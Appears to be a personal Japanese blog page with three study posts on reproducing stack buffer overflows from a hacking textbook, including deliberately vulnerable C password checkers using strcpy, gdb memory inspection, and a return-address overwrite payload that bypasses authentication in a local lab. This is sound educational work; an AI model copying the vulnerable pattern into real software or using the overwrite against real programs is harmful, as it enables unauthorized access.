@@ -1,0 +1,1592 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>KentaKomai's BLOG</title>
+  <meta name="author" content="Kenta Komai">
+
+  
+  <meta name="description" content="前回、途中までこの記事を書いて、問題発生しちゃってうまく再現できなかったので、書き直し。 ざっくりと内容を説明します。 こちらの技術書に書いてあるBOFの項目の復習と再現記録です。 環境は今回に限りUbuntu7.0.2 + gcc 3.3.6(前回の日記に書いた通り、 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://KentaKomai.github.io/blog/page/7">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="KentaKomai's BLOG" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner">
+	<div class="header-title"><a href="/">KentaKomai's BLOG</a></div>
+
+
+	<br><div class="header-subtitle">自分用備忘録の延長</div>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:KentaKomai.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/03/03/wordpress17/">簡単なバッファオーバーフローを再現してみる（２）</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-03T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>前回、途中までこの記事を書いて、問題発生しちゃってうまく再現できなかったので、書き直し。</p>
+
+<p>ざっくりと内容を説明します。</p>
+
+<p><a href="http://www.amazon.co.jp/Hacking-%E7%BE%8E%E3%81%97%E3%81%8D%E7%AD%96%E8%AC%80-%E2%80%95%E8%84%86%E5%BC%B1%E6%80%A7%E6%94%BB%E6%92%83%E3%81%AE%E7%90%86%E8%AB%96%E3%81%A8%E5%AE%9F%E9%9A%9B-Jon-Erickson/dp/4873115140">こちらの技術書</a>に書いてあるBOFの項目の復習と再現記録です。</p>
+
+<p>環境は今回に限りUbuntu7.0.2 + gcc 3.3.6(前回の日記に書いた通り、当初の環境だとうまく再現できなかったため)</p>
+
+<p>今回は関数の戻りアドレスの上書きを検証します。</p>
+
+<p><a href="https://github.com/KentaKomai/warehouse/blob/master/bof_sample/bof_sample2.c">コード</a>はこちら。</p>
+
+<pre class="lang:c decode:true">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int check(char *password){
+    char password_buffer[16];
+    int auth_flag=0;
+    printf("auth_flag:%dn", auth_flag);
+    printf("password_buffer:%sn", password_buffer);
+
+    strcpy(password_buffer, password);
+
+    printf("auth_flag:%dn", auth_flag);
+    printf("password_buffer:%sn", password_buffer);
+
+    if(strcmp(password_buffer, "SamplePassword") == 0){
+        auth_flag = 1;
+    }
+
+    return auth_flag;
+}
+
+int main(int argc, char *argv[]) {
+
+    if(argc &lt; 2){
+        printf("usage: %s &lt;password&gt;n", argv[0]);
+        exit(0);
+    }
+
+    if(check(argv[1])){
+        printf("--------------------------n");
+        printf("authentication is success!n");
+        printf("--------------------------n");
+    }else{
+        printf("password id different...n");
+    }
+
+    return 0;
+}</pre>
+
+
+<p>最初はpassword_bufferへ確保されているサイズ以上の文字列を与えることで、auth_flagを上書きする、というものでしたが、今回はメモリ上でauth_flagがアドレスが小さいため、その手法が利用できません。</p>
+
+<p>今回は再現と検証に時間かかりすぎました・・・。バージョンの違いでずいぶんと挙動が変わりますね・・・。</p>
+
+<p>ざっくりといきます。まずはいつもどおりブレイクポイント仕掛けて、メモリの位置を確認してあげます。<br/>
+まずは実行</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.00.14.png" rel="image_group"><img class="alignnone size-large wp-image-191" alt="Screen Shot 2013-03-01 at 19.00.14" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.00.14.png?resize=625%2C65" data-recalc-dims="1" /></a></p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+
+<p>次はメモリアドレスを調べてあげます。<a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.01.30.png" rel="image_group"><img class="alignnone size-full wp-image-192" alt="Screen Shot 2013-03-01 at 19.01.30" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.01.30.png?resize=876%2C320" data-recalc-dims="1" /></a>auth_flagがpassword_bufferより小さいメモリアドレスになってるのがわかります。</p>
+
+<p>つまり、単純にpassword_bufferに大量の文字列を挿入して上書きしても、auth_flagnには何の影響も出ないことがわかります。</p>
+
+<p>そのまま実行を続けても・・・</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.04.49.png" rel="image_group"><img class="alignnone size-large wp-image-193" alt="Screen Shot 2013-03-01 at 19.04.49" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.04.49.png?resize=625%2C167" data-recalc-dims="1" /></a>メイン関数に戻る前にSegmentation faultになって強制終了しちゃいます。</p>
+
+<p>なので、今度はアセンブラにして見てみます。main()関数のほうをアセンブラに変換してみます。</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.07.40.png" rel="image_group"><img class="alignnone size-large wp-image-194" alt="Screen Shot 2013-03-01 at 19.07.40" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.07.40.png?resize=625%2C606" data-recalc-dims="1" /></a>注目するべきはアドレス 0x08484e4 &lt;main+66>の箇所です。</p>
+
+<p>ここでcheck()関数を呼び出しています。関数呼び出しが行われると、その前のmov命令で、メモリ上のスタックセグメントに、引数とか、callした関数から処理がmain()関数に戻ってくるためのアドレスなどが、プッシュされます。（この辺の仕組みも復習のため別途記事書きます。今決めました。）すごーくざっくり言うと、この場合check()関数が終わった後に、次の行である0x08484e9へ戻るために、そのアドレスをスタックに格納する仕組みになっています。もちろん、呼び出された関数内より先にスタックにpushされるので、check()関数内のpassword_bufferやauth_flagより先にスタックに格納されていることになります。</p>
+
+<p>つまりは、アドレスの小さい順にこの３つを書くと</p>
+
+<p>auth_flag, password_buffer, main()関数への戻りアドレス</p>
+
+<p>になっているはずなんです。（他にも格納されているものはありますが、今は分かりやすくこの３つだけを取り上げます。）</p>
+
+<p>確認してみます。今回は引数にわかりやすい文字列を、16文字ぴったり与えてみます。 <a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.18.36.png" rel="image_group"><img class="alignnone size-large wp-image-196" alt="Screen Shot 2013-03-01 at 19.18.36" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.18.36.png?resize=625%2C128" data-recalc-dims="1" /></a>ブレイクポイントのところで、引数をpassword_bufferへコピーしているので、もうひとつだけ進めます(stepコマンドでステップ実行)</p>
+
+<p>その状態で、メモリアドレス内を確認してみます。</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.19.20.png" rel="image_group"><img class="alignnone size-large wp-image-198" alt="Screen Shot 2013-03-01 at 19.19.20" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.19.20.png?resize=625%2C159" data-recalc-dims="1" /></a></p>
+
+<p>引数で与えた通りに、0xbffff820から16byte分にhogeが４回格納されていますね（リトルエンディアンなので、4byteごとに逆に格納されていることに注意してください。）</p>
+
+<p>そして、その後、12byte後(0xbffff83c)から4byteに、 main()関数の戻りアドレスである0x08484e9が格納されているのが確認できます。</p>
+
+<p>つまり、ここを認証後の処理が格納されているメモリアドレスに書き換えてしまえば良さそうです。認証後の処理がどのアドレスに格納されているかを確認していきます。またアセンブラで処理を表示させます。( disassemble main )</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.27.25.png" rel="image_group"><img class="alignnone size-large wp-image-199" alt="Screen Shot 2013-03-01 at 19.27.25" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-01-at-19.27.25.png?resize=625%2C285" data-recalc-dims="1" /></a></p>
+
+<p>ぶっちゃけこれはサンプル用に書いたプログラムなんで、一目瞭然と言っていいくらいに見やすくなっちゃってますが、check()関数から帰ってきて２行目、0x08484ebで何かしらの比較を行なって、その後0&#215;08484513にジャンプして、そのあと、print()関数を呼び出しています。</p>
+
+<p>これってif文がelseになった時の処理じゃないか・・・とアタリをつけます。（キッチリ追っていけばもちろん根拠を持ってそうなりますが）</p>
+
+<p>つまりそれより前にある、print()関数を三回コールしているところが、if文がtrueだったときの処理ですね。最初のprint()関数が呼ばれているひとつ前の0x080484edへ、戻りアドレスを書き換えれば、認証を回避できるかもしれないので、やってみます。</p>
+
+<p>引数にこのアドレスを突っ込んであげればOKです。リトルエンディアンなので、1byteづつ後ろから並び替えて与えます。xedx84x04x08ですね。</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-03-at-1.48.36.png" rel="image_group"><img class="alignnone size-large wp-image-210" alt="Screen Shot 2013-03-03 at 1.48.36" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-03-at-1.48.36.png?resize=625%2C152" data-recalc-dims="1" /></a>引数にperlでxedx84x04x08を10回繰り返して与えます。それによってpassword_bufferをBOFさせます。その状態でpassword_buffer周辺のメモリ内容を確認してみます。</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-03-at-1.52.18.png" rel="image_group"><img class="alignnone size-large wp-image-211" alt="Screen Shot 2013-03-03 at 1.52.18" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-03-at-1.52.18.png?resize=625%2C144" data-recalc-dims="1" /></a>ご覧の通り、先ほどの場所のアドレスが0x980484edで上書きされてますね！これで、check()関数が終わったあと、そのままそのアドレスへ戻るようになります。その状態で、動作させてみます。</p>
+
+<p><a href="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-03-at-1.55.19.png" rel="image_group"><img class="alignnone size-large wp-image-212" alt="Screen Shot 2013-03-03 at 1.55.19" src="http://i2.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/03/Screen-Shot-2013-03-03-at-1.55.19.png?resize=625%2C202" data-recalc-dims="1" /></a>認証を回避し、authentication is success!が表示されていますね。</p>
+
+<p>こんな感じです。</p>
+
+<p>この手法を使うことによって、auth_flagがメモリ上にBOFさせるアドレスより前にある場合でも認証を回避しています。つまり任意のアドレスにジャンプさせることができます。（本当は各アセンブラの処理内容についてもまとめようと思いましたが、ちょっと長くなりすぎるので、またの機会にまとめます。）</p>
+
+<p>次回のBOFの記事では、いよいよ任意のコードを挿入する手法について書きたいと思いますが、自分の環境で再現し、理解してからなので、時間かかっちゃいそうです・・・。</p>
+
+<p>その前にnullcon Battle Undergroundで自分が担当した問題のwriteupの記事書きます。今日は早めに寝よう・・・。</p>
+
+<p>&nbsp;</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/28/wordpress16/">BOFの勉強中に発生したスタックセグメントの謎(CentOS6.3 + Gcc 4.4.6)</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-28T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>本当は、前回に引き続き、<a href="http://www.amazon.co.jp/Hacking-%E7%BE%8E%E3%81%97%E3%81%8D%E7%AD%96%E8%AC%80-%E2%80%95%E8%84%86%E5%BC%B1%E6%80%A7%E6%94%BB%E6%92%83%E3%81%AE%E7%90%86%E8%AB%96%E3%81%A8%E5%AE%9F%E9%9A%9B-Jon-Erickson/dp/4873115140">こちらの参考書</a>のバッファオーバーフローに関してを個人的に復習してまとめるために書こうと思ったんですが、再現の過程で、なんかよくわからない問題にぶつかったのでメモメモ。</p>
+
+<p>前回はpassword_bufferの後に、auth_flagがメモリ上に確保されており、password_bufferを単純に配列より大きい文字列を与えたことによって、auth_flagの領域まで上書きしてしまう、というところまで再現しました。</p>
+
+<p>今回はこちらのコードをBOFさせ、不正に認証処理を回避していきます。 <a href="https://github.com/KentaKomai/warehouse/blob/master/bof_sample/bof_sample2.c">コードはこちら</a></p>
+
+<pre class="lang:c decode:true">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int check(char *password){
+    char password_buffer[16];  //auth_flagと宣言場所を入れ替えただけ
+    int auth_flag=0;           //
+    printf("auth_flag:%dn", auth_flag);
+    printf("password_buffer:%sn", password_buffer);
+
+    strcpy(password_buffer, password);
+
+    printf("auth_flag:%dn", auth_flag);
+    printf("password_buffer:%sn", password_buffer);
+
+    if(strcmp(password_buffer, "SamplePassword") == 0){
+        auth_flag = 1;
+    }
+
+    return auth_flag;
+}
+
+int main(int argc, char *argv[]) {
+
+    if(argc &lt; 2){
+        printf("usage: %s &lt;password&gt;n", argv[0]);
+        exit(0);
+    }
+
+    if(check(argv[1])){
+        printf("--------------------------n");
+        printf("authentication is success!n");
+        printf("--------------------------n");
+    }else{
+        printf("password id different...n");
+    }
+
+    return 0;
+}</pre>
+
+
+<p>前回からの変更点は一箇所だけです。password_bufferを先に宣言してから、auth_flagを宣言しています。まずはこのコードを通常実行させた場合のメモリの状態を見ていきます。前回結構詳細まで書いたので、gdbデバッガのオプションとかの説明は省略いたします。</p>
+
+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-27-at-20.46.37.png" rel="image_group"><img class="alignnone size-large wp-image-178" alt="Screen Shot 2013-02-27 at 20.46.37" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-27-at-20.46.37.png?resize=625%2C83" data-recalc-dims="1" /></a></p>
+
+<p>前回と同じ箇所にブレイクポイントを設定しておきます</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-27-at-20.47.32.png" rel="image_group"><img class="alignnone size-large wp-image-179" alt="Screen Shot 2013-02-27 at 20.47.32" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-27-at-20.47.32.png?resize=625%2C834" data-recalc-dims="1" /></a>後ろに豪快に、twitterとか、ブラウザが映り込んでしまっていますが、まぁいいでしょう（笑）これで準備OKです。</p>
+
+<p>実際に動かしてみます。</p>
+
+<p>ここで問題発生・・・前回のサンプルを動作させたCentOS 6.2とgcc4.4.6だと変数の宣言位置を変えてもメモリの位置関係が変わらない・・・orz</p>
+
+<p>書きなおしてもchar型配列のpassword_buffer[]がauth_flagの前にきちゃう・・・</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-28-at-13.57.58.png" rel="image_group"><img class="alignnone size-full wp-image-181" alt="Screen Shot 2013-02-28 at 13.57.58" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-28-at-13.57.58.png?resize=740%2C190" data-recalc-dims="1" /></a></p>
+
+<p>gccの「最適化しない」オプションの&#8221;-O0&#8243;(大文字のOに数字の0)を付けてコンパイルしても結果は同じ・・・どういうこっちゃ・・・</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-28-at-14.01.01.png" rel="image_group"><img class="alignnone size-large wp-image-182" alt="Screen Shot 2013-02-28 at 14.01.01" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-28-at-14.01.01.png?resize=625%2C19" data-recalc-dims="1" /></a>結局原因がわからないので、ちょっとしたテストしてみました。<a href="https://github.com/KentaKomai/warehouse/blob/master/bof_sample/stack_segment_sample.c">コードはこちら</a></p>
+
+<pre class="lang:c decode:true">#include &lt;stdio.h&gt;
+
+void sample_func() {
+    int a;
+    float b;
+    char c[16];
+    int d=1;
+    char e[] = "hoge";
+    float f;
+    double g;
+    char h = 'A';
+
+    printf("[int a]             ntaddress: %p, value: %dn", &a, a);
+    printf("[float b]           ntaddress: %p, value: %fn", &b, b);
+    printf("[char c[16]]        ntaddress: %p, value: %sn", &c, c);
+    printf("[int d]             ntaddress: %p, value: %dn", &d, d);
+    printf("[char e[]="hoge"] ntaddress: %p, value: %sn", &e, e);
+    printf("[float f]           ntaddress: %p, value: %fn", &f, f);
+    printf("[double g]          ntaddress: %p, value: %fn", &g, g);
+    printf("[char h]            ntaddress: %p, value: %cn", &h, h);
+    printf("");
+}
+
+int main() {
+    sample_func();
+
+    return 1;
+}</pre>
+
+
+<p>いろんな型を適当な順番に宣言して、メモリ上にどのように確保されるのか、を環境ごとにチェックしていきます。（ブログの内容から少しづれちゃってるので、今度別の記事にまとめるかもしれません。）手元にある環境がCentOS6.2 , MacOSX MountainLion, Ubuntu7.0.4 なので、それぞれ比較してみたいと思います。</p>
+
+<pre class="lang:default decode:true">CentOSの実行結果
+[int a]             
+    address: 0x7fff5f9b589c, value: 0
+[float b]           
+    address: 0x7fff5f9b5898, value: 0.000000
+[char c[16]]        
+    address: 0x7fff5f9b5880, value: ??/
+[int d]             
+    address: 0x7fff5f9b587c, value: 1
+[char e[]="hoge"] 
+    address: 0x7fff5f9b5870, value: hoge
+[float f]           
+    address: 0x7fff5f9b586c, value: 0.000000
+[double g]          
+    address: 0x7fff5f9b5860, value: 0.000000
+[char h]            
+    address: 0x7fff5f9b585f, value: A</pre>
+
+
+<p>&nbsp;</p>
+
+<pre class="lang:default decode:true">MacOSX MountainLionでの実行結果
+[int a]             
+    address: 0x7fff54f43ad4, value: 0
+[float b]           
+    address: 0x7fff54f43ad0, value: 0.000000
+[char c[16]]        
+    address: 0x7fff54f43ac0, value: ?;?T?
+[int d]             
+    address: 0x7fff54f43abc, value: 1
+[char e[]="hoge"] 
+    address: 0x7fff54f43ab7, value: hoge
+[float f]           
+    address: 0x7fff54f43ab0, value: 84487047088281579297964032.000000
+[double g]          
+    address: 0x7fff54f43aa8, value: 0.000000
+[char h]</pre>
+
+
+
+
+<pre class="lang:default decode:true">Ubuntu 7.0.2 での実行結果
+[int a]         
+    address: 0xbffff86c, value: -1208127500
+[float b]           
+    address: 0xbffff868, value: -1.999772
+[char c[16]]            
+    address: 0xbffff850, value: )???o?????o?????????o?G?????????
+
+[int d]         
+    address: 0xbffff84c, value: 1
+[char e[]="hoge"]           
+    address: 0xbffff830, value: hoge
+[float f]           
+    address: 0xbffff82c, value: 0.000000
+[double g]          
+    address: 0xbffff820, value: -3604655383755433769197826738674175521782556248991827081424445322068085660951848988008359023833653791086039166604250922829306995844218622282391301394297557410229426847600630490873798365781900456637227492496948050077753875177583571444659973485044126302847656525824.000000
+[char h]            
+    address: 0xbffff81f, value: A</pre>
+
+
+<p>ごめんなさい、見づらいと思うんですが、どの環境でもちゃんとスタック状に詰まれてるんですよね・・・じゃぁなぜあの問題が起きるのか・・・申し訳ないです、結局特定はできていません・・・。ちなみに、以下のコードをCentOS でコンパイルしてgdbデバッグでメモリ確認すると、メモリの位置関係がスタック状ではなくなっていることが再現できました。</p>
+
+<pre class="lang:default decode:true">#include &lt;stdio.h&gt;
+
+int main(){
+    int auth_flag1 = 0;
+    char password_buffer1[16];
+    char password_buffer2[16];
+    int auth_flag2 = 1;
+
+    return 0;
+}</pre>
+
+
+<p>こちらをデバッグしてみると</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-28-at-16.09.20.png" rel="image_group"><img class="alignnone size-full wp-image-185" alt="Screen Shot 2013-02-28 at 16.09.20" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-28-at-16.09.20.png?resize=738%2C352" data-recalc-dims="1" /></a></p>
+
+<p>宣言された順番にアドレス値を確認しているので、通常通りスタックに詰まれていけばアドレス値は小さくなるはずなんですが、メモリには</p>
+
+<ol>
+<li>password_buffer2</li>
+<li>password_buffer1</li>
+<li>auth_flag1</li>
+<li>auth_flag2</li>
+</ol>
+
+
+<p>の順番に詰まれていることがわかります・・・これは一体・・・ 。</p>
+
+<p>とりあえずわかったこと</p>
+
+<ol>
+<li>MacOSX Mountain Lion + gcc 4.2.1 と、Ubuntu7.0.2 + gcc3.3.6は、上記３つのコードとも、通常通り、宣言された順番でスタックに詰まれていく</li>
+<li>CentOS 6.3 + gcc 4.4.6は、２つ目のサンプル（色々な型をごちゃごちゃに宣言したもの）は通常通り、宣言された順番でスタックに詰まれていく</li>
+<li>CentOS 6.3 + gcc 4.4.6は、char型配列とint型を宣言するとchar型配列が優先されてスタックに詰まれている（ように現状見える）</li>
+<li>ついでだけど、MacOSX Mountain Lion + gcc 4.2.1とCentOS 6.3 + gcc 4.4.6では初期化されてない整数型、浮動小数点型は自動で初期化されるっぽい（何度やってもaとbは0クリアされてる。でもMacのほうは２つ目のfloatは初期化されない）※これは「そうなってるのかー」と解っただけで、自分でプログラム書く時初期化なしでもゼロとして使ってOKという訳では絶対ない（笑）念のため</li>
+<li>あと、基本的な見落としがあるのかもしれないけど、char型[16]の配列を宣言すると、MacOSXは16byte確保するのに対して、CentOS6.3とUbuntu7.0.2は28byte確保している。（なんじゃこりゃ）</li>
+</ol>
+
+
+<p>原因わかる方・・・アドバイスくだしあ・・・・涙</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/26/wordpress15/">簡単なバッファオーバーフローを再現してみる（１）</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-26T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>自分の復習用に書いておきます。</p>
+
+<p>CodeGate2012 Vuln300を解いていたんですが、他の方が解いたwriteupを見るとBOFを利用したシェルコードの実行が必要不可欠なんですが、正直さっぱりでしたので、手元にある技術書を参考にBOFの脆弱性を持ったプログラムと、その脆弱性を利用したシェルコードを実行してみたいと思います。<a href="http://www.amazon.co.jp/Hacking-%E7%BE%8E%E3%81%97%E3%81%8D%E7%AD%96%E8%AC%80-%E2%80%95%E8%84%86%E5%BC%B1%E6%80%A7%E6%94%BB%E6%92%83%E3%81%AE%E7%90%86%E8%AB%96%E3%81%A8%E5%AE%9F%E9%9A%9B-Jon-Erickson/dp/4873115140">今回の内容再現に参考・利用させていただいている技術書</a></p>
+
+<p>本当に基礎的な部分なので、退屈かもしれません。申し訳ないです。原理はわかっていても、実際問題を解いてみると全く理解できていなかったのがよくよくわかりました・・・orz</p>
+
+<p>実行環境はCentOS 6.3です。バージョンの確認は ”$cat /etc/redhat-release”で確認できます</p>
+
+<p>とりあえず書いた<a href="https://github.com/KentaKomai/warehouse/blob/master/bof_sample/bof_sample.c">コード</a>。読んでる本に出たサンプルを少し変えただけです。</p>
+
+<pre class="lang:c decode:true">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int check(char *password){
+    int auth_flag=0;
+    char password_buffer[16];
+    printf("auth_flag:%d\n", auth_flag);
+    printf("password_buffer:%s\n", password_buffer);
+
+    strcpy(password_buffer, password);
+
+    printf("auth_flag:%d\n", auth_flag);
+    printf("password_buffer:%s\n", password_buffer);
+
+    if(strcmp(password_buffer, "SamplePassword") == 0){
+        auth_flag = 1;
+    }
+
+    return auth_flag;
+}
+
+int main(int argc, char *argv[]) {
+
+    if(argc &lt; 2){
+        printf("usage: %s &lt;password&gt;\n", argv[0]);
+        exit(0);
+    }
+
+    if(check(argv[1])){
+        printf("--------------------------\n");
+        printf("authentication is success!\n");
+        printf("--------------------------\n");
+    }else{
+        printf("login failed...\n");
+    }
+
+    return 0;
+}</pre>
+
+
+<p>引数に与えられた文字列を&#8221;SamplePassword&#8221;と等しければ、認証成功の旨が書かれたメッセージが出力される単純なプログラムですね。それぞれ変数の値が見えるように、文字列比較処理の前後に標準出力に変数を表示するようにしてあります。</p>
+
+<p>以下、通常に実行した場合の出力です。いつもは普段使ってるMacでスクリーンショットとってましたが、今回はローカル限定の仮想環境なんで、ホスト名とかそのままのっけちゃいます。</p>
+
+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-12.44.54.png" rel="image_group"><img class="alignnone size-full wp-image-151" alt="Screen Shot 2013-02-26 at 12.44.54" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-12.44.54.png?resize=898%2C572" data-recalc-dims="1" /></a></p>
+
+<p>引数なしで、利用方法が出力。引数に文字列を与えると、それが正しいパスワードであるかをチェックして結果を出力しています。</p>
+
+<p>しかし、以下のように実行してあげると</p>
+
+<p><a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-13.55.03.png" rel="image_group"><img class="alignnone size-large wp-image-152" alt="Screen Shot 2013-02-26 at 13.55.03" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-13.55.03.png?resize=625%2C211" data-recalc-dims="1" /></a></p>
+
+<p>正しいパスワード文字列を引数として与えてないにも関わらず、認証成功の出力が表示されてしまいます。なぜこのような処理が実行されてしまているのか。チェックしていきます。</p>
+
+<p>Linux上で動作するgdbコマンド（デバッガ）を利用します。ざっくりとした使い方は、調査を進めながら随時紹介します。</p>
+
+<p>その前にデバッグをしやすいように、コンパイル時にオプションを付加してコンパイルし直します。（これはあくまで勉強用にオプションを付加しているだけで、CTFで問題として与えられるファイルは既にコンパイルされており、このオプションを付加することはまずできません。）-gオプションをつけると実行ファイルにデバッグ情報を付加することができます。</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-14.11.58.png" rel="image_group"><img class="alignnone size-large wp-image-155" alt="Screen Shot 2013-02-26 at 14.11.58" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/Screen-Shot-2013-02-26-at-14.11.58.png?resize=625%2C242" data-recalc-dims="1" /></a></p>
+
+<p>gdbは引数にデバッグしたい実行ファイルのパスを与えるだけです。dbgのコンソールが実行され、入力待ち状態になります。</p>
+
+<p>コンパイル時にデバッグ情報を付加したおかげでlistコマンドが使えます。list &lt;整数n>でn行目から始まるソースを10行ずつ表示できます。</p>
+
